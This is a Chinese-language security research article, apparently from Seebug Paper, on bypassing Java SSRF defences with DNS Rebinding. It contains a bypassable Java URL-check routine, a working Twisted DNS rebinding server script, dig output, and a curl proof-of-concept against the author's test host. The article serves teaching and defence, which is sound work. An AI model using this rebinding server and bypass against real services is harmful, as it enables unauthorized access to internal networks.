@@ -1,0 +1,319 @@
+作者：[JoyChou@美联安全](https://mp.weixin.qq.com/s/545el33HNI0rVi2BGVP5_Q
+"JoyChou@美联安全")
+
+#### 0x00 前言
+
+本篇文章会比较详细的介绍，如何使用 DNS Rebinding 绕过 Java 中的 SSRF。网上有蛮多资料介绍用该方法绕过常规的 SSRF，但是由于
+Java 的机制和 PHP 等语言不太一样。所以，我觉得，有必要单独拿出来聊一聊，毕竟目前很多甲方公司业务代码都是 Java。
+
+#### 0x01 SSRF修复逻辑
+
+  1. 取URL的Host
+  2. 取Host的IP
+  3. 判断是否是内网IP，是内网IP直接return，不再往下执行
+  4. 请求URL
+  5. 如果有跳转，取出跳转URL，执行第1步
+  6. 正常的业务逻辑里，当判断完成最后会去请求URL，实现业务逻辑。
+
+所以，其中会发起 DNS 请求的步骤为，第2、4、6步，看来至少要请求3次。因为第6步至少会执行1次 DNS 请求。
+
+另外，网上有很多不严谨的 SSRF 修复逻辑不会判断跳转，导致可以被 Bypass。
+
+#### 0x02 DNS Rebinding
+
+我个人理解如下：
+
+通过自己搭建 DNS 服务器，返回自己定义的 IP，进行一些限制的绕过。
+
+所以，我们可以利用 DNS Rebinding 在第一次发起 DNS 请求时，返回外网 IP，后面全部返回内网 IP 这种方式来绕过如上的修复逻辑。
+
+我们来看下是如何绕过的。
+
+首先，修复逻辑中第2步发起 DNS 请求，DNS服务器返回一个外网 IP，通过验证，执行到第四步。
+
+接着，修复逻辑中第4步会发起 DNS 请求，DNS服务器返回一个内网 IP。此时，SSRF 已经产生。
+
+##### TTL
+
+不过，这一切都是在 TTL 为0的前提下。
+
+什么是TTL？
+
+> TTL(Time To Live)是 DNS 缓存的时间。简单理解，假如一个域名的 TTL 为10s，当我们在这10s内，对该域名进行多次 DNS
+> 请求，DNS 服务器，只会收到一次请求，其他的都是缓存。
+
+所以搭建的 DNS 服务器，需要设置 TTL 为0。如果不设置 TTL 为0，第二次 DNS 请求返回的是第一次缓存的外网 IP，也就不能绕过了。
+
+##### DNS请求过程
+
+步骤如下：
+
+  1. 查询本地 DNS 服务器(`/etc/resolv.conf`)
+  2. 如果有缓存，返回缓存的结果，不继续往下执行
+  3. 如果没有缓存，请求远程 DNS 服务器，并返回结果
+
+##### DNS缓存机制
+
+平时使用的 MAC 和 Windows 电脑上，为了加快 HTTP 访问速度，系统都会进行 DNS 缓存。但是，在 Linux 上，默认不会进行 [DNS
+缓存](https://stackoverflow.com/questions/11020027/dns-caching-in-linux "DNS
+缓存")，除非运行 nscd 等软件。
+
+不过，知道 Linux 默认不进行 DNS 缓存即可。这也解释了，我为什么同样的配置，我在 MAC 上配置不成功，Linux 上配置可以。
+
+需要注意的是，IP 为8.8.8.8的 DNS 地址，本地不会进行 DNS 缓存。
+
+#### 0x03 漏洞测试
+
+准备如下环境：
+
+  * Java Web应用
+  * DNS服务器
+
+我们要先了解下 Java 应用的 TTL。Java 应用的默认 TTL 为10s，这个默认配置会导致 DNS Rebinding
+绕过失败。也就是说，默认情况下，Java 应用不受 DNS Rebinding 影响。
+
+Java TTL的值可以通过下面两种方式进行修改：
+
+  1. 修改`/Library/Java/JavaVirtualMachines/jdk1.8.0_121.jdk/Contents/Home/jre/lib/security/java.security`(我MAC下的路径)里的`networkaddress.cache.negative.ttl=0`
+
+  2. 通过代码进行修改`java.security.Security.setProperty("networkaddress.cache.negative.ttl" , "0");`
+
+这个地方是个大坑，我之前在测试时，一直因为这个原因，导致测试不成功。
+
+这也是利用 DNS Rebinding 过程中，Java 和 PHP 不一样的地方。在测试 PHP 时，这份 PHP 代码用 DNS Rebinding
+可以绕过，类似的代码 Java 就不能被绕过了。
+
+##### SSRF漏洞搭建
+
+用 Java Spring 写了一个漏洞测试地址为
+`http://test.joychou.org:8080/checkssrf?url=http://dns_rebind.joychou.me`。URL会进行SSRF验证。
+
+SSRF修复代码如下。也可以在[Github](https://github.com/JoyChou93/trident "Github")上查看
+
+    
+    
+    /*
+            * check SSRF (判断逻辑为判断URL的IP是否是内网IP)
+            * 如果是内网IP，返回false，表示checkSSRF不通过。否则返回true。即合法返回true
+            * URL只支持HTTP协议
+            * 设置了访问超时时间为3s
+         */
+        public static Boolean checkSSRF(String url) {
+    
+            HttpURLConnection connection;
+            String finalUrl = url;
+            try {
+                do {
+                    // 判断当前请求的URL是否是内网ip
+                    Boolean bRet = isInnerIpFromUrl(finalUrl);
+                    if (bRet) {
+                        return false;
+                    }
+    
+                    connection = (HttpURLConnection) new URL(finalUrl).openConnection();
+                    connection.setInstanceFollowRedirects(false);
+                    connection.setUseCaches(false); // 设置为false，手动处理跳转，可以拿到每个跳转的URL
+                    connection.setConnectTimeout(3*1000); // 设置连接超时时间为3s
+                    //connection.setRequestMethod("GET");
+                    connection.connect(); // send dns request
+                    int responseCode = connection.getResponseCode(); // 发起网络请求 no dns request
+                    if (responseCode >= 300 && responseCode < 400) {
+                        String redirectedUrl = connection.getHeaderField("Location");
+                        if (null == redirectedUrl)
+                            break;
+                        finalUrl = redirectedUrl;
+                        // System.out.println("redirected url: " + finalUrl);
+                    } else
+                        break;
+                } while (connection.getResponseCode() != HttpURLConnection.HTTP_OK);
+                connection.disconnect();
+            } catch (Exception e) {
+                return true;
+            }
+            return true;
+        }
+    
+        /*
+            内网IP：
+            10.0.0.1 - 10.255.255.254       (10.0.0.0/8)
+            192.168.0.1 - 192.168.255.254   (192.168.0.0/16)
+            127.0.0.1 - 127.255.255.254     (127.0.0.0/8)
+            172.16.0.1 - 172.31.255.254     (172.16.0.0/12)
+        */
+        public static boolean isInnerIp(String strIP) throws IOException {
+            try{
+                String[] ipArr = strIP.split("\\.");
+                if (ipArr.length != 4){
+                    return false;
+                }
+    
+                int ip_split1 = Integer.parseInt(ipArr[1]);
+    
+                return (ipArr[0].equals("10") ||
+                        ipArr[0].equals("127") ||
+                        (ipArr[0].equals("172") && ip_split1 >= 16 && ip_split1 <=31) ||
+                        (ipArr[0].equals("192") && ipArr[1].equals("168")));
+            }catch (Exception e) {
+                return false;
+            }
+    
+        }
+        /*
+            * 域名转换为IP
+            * 会将各种进制的ip转为正常ip
+            * 167772161转换为10.0.0.1
+            * 127.0.0.1.xip.io转换为127.0.0.1
+        */
+        public static String DomainToIP(String domain) throws IOException{
+            try {
+                InetAddress IpAddress = InetAddress.getByName(domain); //  send dns request
+                return IpAddress.getHostAddress();
+            }
+            catch (Exception e) {
+                return "";
+            }
+        }
+    
+        /*
+            从URL中获取域名
+            限制为http/https协议
+        */
+        public static String getUrlDomain(String url) throws IOException{
+            try {
+                URL u = new URL(url);
+                if (!u.getProtocol().startsWith("http") && !u.getProtocol().startsWith("https")) {
+                    throw new IOException("Protocol error: " + u.getProtocol());
+                }
+                return u.getHost();
+            } catch (Exception e) {
+                return "";
+            }
+    
+        }
+
+##### 搭建DNS服务器
+
+域名配置如下：
+
+![](https://images.seebug.org/content/images/2017/09/808ee852-0e41-4798-9017-002ea98bf439.jpg-w331s)
+
+此时，当访问`dns_rebind.joychou.me`域名，先解析该域名的 DNS
+域名为`ns.joychou.me，ns.joychou.me`指向47这台服务器。
+
+DNS Server 代码如下，放在47服务器上。其功能是将第一次DNS请求返回`35.185.163.135`，后面所有请求返回`127.0.0.1`
+
+dns.py
+
+    
+    
+    from twisted.internet import reactor, defer
+    from twisted.names import client, dns, error, server
+    record={}
+    class DynamicResolver(object):
+        def _doDynamicResponse(self, query):
+            name = query.name.name
+            if name not in record or record[name]<1:
+                ip = "35.185.163.135"
+            else:
+                ip = "127.0.0.1"
+            if name not in record:
+                record[name] = 0
+            record[name] += 1
+            print name + " ===> " + ip
+            answer = dns.RRHeader(
+                name = name,
+                type = dns.A,
+                cls = dns.IN,
+                ttl = 0,
+                payload = dns.Record_A(address = b'%s' % ip, ttl=0)
+            )
+            answers = [answer]
+            authority = []
+            additional = []
+            return answers, authority, additional
+        def query(self, query, timeout=None):
+            return defer.succeed(self._doDynamicResponse(query))
+    def main():
+        factory = server.DNSServerFactory(
+            clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')]
+        )
+        protocol = dns.DNSDatagramProtocol(controller=factory)
+        reactor.listenUDP(53, protocol)
+        reactor.run()
+    if __name__ == '__main__':
+        raise SystemExit(main())
+
+运行python dns.py，dig查看下返回。
+
+    
+    
+    ➜  security dig @8.8.8.8 dns_rebind.joychou.me
+    
+    ; <<>> DiG 9.8.3-P1 <<>> @8.8.8.8 dns_rebind.joychou.me
+    ; (1 server found)
+    ;; global options: +cmd
+    ;; Got answer:
+    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 40376
+    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+    
+    ;; QUESTION SECTION:
+    ;dns_rebind.joychou.me.     IN  A
+    
+    ;; ANSWER SECTION:
+    dns_rebind.joychou.me.  0   IN  A   35.185.163.135
+    
+    ;; Query time: 203 msec
+    ;; SERVER: 8.8.8.8#53(8.8.8.8)
+    ;; WHEN: Fri Sep  8 14:52:43 2017
+    ;; MSG SIZE  rcvd: 55
+    
+    ➜  security dig @8.8.8.8 dns_rebind.joychou.me
+    
+    ; <<>> DiG 9.8.3-P1 <<>> @8.8.8.8 dns_rebind.joychou.me
+    ; (1 server found)
+    ;; global options: +cmd
+    ;; Got answer:
+    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14172
+    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+    
+    ;; QUESTION SECTION:
+    ;dns_rebind.joychou.me.     IN  A
+    
+    ;; ANSWER SECTION:
+    dns_rebind.joychou.me.  0   IN  A   127.0.0.1
+    
+    ;; Query time: 172 msec
+    ;; SERVER: 8.8.8.8#53(8.8.8.8)
+    ;; WHEN: Fri Sep  8 14:52:45 2017
+    ;; MSG SIZE  rcvd: 55
+
+可以看到第一次返回`35.185.163.135`，第二次返回`127.0.0.1`。 dig加上@8.8.8.8是指定本地 DNS
+地址为8.8.8.8，因为该地址不会有缓存。每 dig 一次，DNS Server 都会收到一次请求。
+
+##### 绕过POC
+
+`curl
+'http://test.joychou.org:8080/checkssrf?url=http://dns_rebind.joychou.me'`
+
+返回`test.joychou.org`页面内容 It works.
+
+在测试时，我把该服务器的80端口已经限制为只有本地能访问，所以，我们的 POC 已经绕过内网的限制。
+
+#### 0x04 总结
+
+  * Java 默认不存在被 DNS Rebinding 绕过风险（TTL 默认为10）
+  * PHP 默认会被 DNS Rebinding 绕过
+  * Linux 默认不会进行 DNS 缓存
+
+#### 0x05 参考
+
+  1. <http://blog.csdn.net/u011721501/article/details/54667714>
+  2. <https://stackoverflow.com/questions/11020027/dns-caching-in-linux>
+  3. <https://bobao.360.cn/learning/detail/3074.html>
+  4. <https://github.com/chengable/safe_code/blob/master/ssrf_check.php>
+
+* * *
+
+![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
+本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/390/>
+
